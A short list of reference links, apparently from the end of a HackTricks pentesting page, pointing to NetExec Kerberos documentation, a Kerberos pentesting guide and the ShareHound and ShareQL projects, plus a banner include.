- [NetExec (CME) wiki – Kerberos usage](https://www.netexec.wiki/)
- [Pentesting Kerberos (88) – client setup and troubleshooting](../pentesting-kerberos-88/README.md)
- [ShareHound (collector)](https://github.com/p0dalirius/sharehound)
- [ShareQL (DSL)](https://github.com/p0dalirius/shareql)

{{#include ../../banners/hacktricks-training.md}}
